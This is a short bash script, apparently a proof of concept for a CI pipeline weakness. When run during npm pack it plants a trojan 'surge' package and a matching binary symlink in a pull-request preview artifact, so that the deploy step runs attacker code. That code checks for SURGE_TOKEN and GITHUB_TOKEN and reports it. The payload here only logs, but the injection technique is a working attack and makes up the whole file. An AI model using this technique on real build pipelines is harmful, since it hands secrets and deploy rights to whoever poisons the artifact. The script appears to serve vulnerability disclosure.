#!/bin/bash
# This runs during npm pack when PR_PREVIEW_DIR is set
if [ -n "$PR_PREVIEW_DIR" ]; then
  mkdir -p "$PR_PREVIEW_DIR/node_modules/.bin"
  mkdir -p "$PR_PREVIEW_DIR/node_modules/surge"
  
  echo '{"name":"surge","version":"99.0.0","bin":{"surge":"index.js"}}' > "$PR_PREVIEW_DIR/node_modules/surge/package.json"
  
  cat > "$PR_PREVIEW_DIR/node_modules/surge/index.js" << 'TROJAN'
#!/usr/bin/env node
console.log("=== PoC: Trojan surge executed ===");
console.log("SURGE_TOKEN is set:", !!process.env.SURGE_TOKEN);
console.log("SURGE_TOKEN length:", (process.env.SURGE_TOKEN || "").length);
console.log("GITHUB_TOKEN is set:", !!process.env.GITHUB_TOKEN);
console.log("=== Proves code execution with access to secrets ===");
process.exit(0);
TROJAN
  
  chmod +x "$PR_PREVIEW_DIR/node_modules/surge/index.js"
  ln -sf ../surge/index.js "$PR_PREVIEW_DIR/node_modules/.bin/surge"
  echo "[PoC] Trojan surge binary injected into artifact directory"
fi
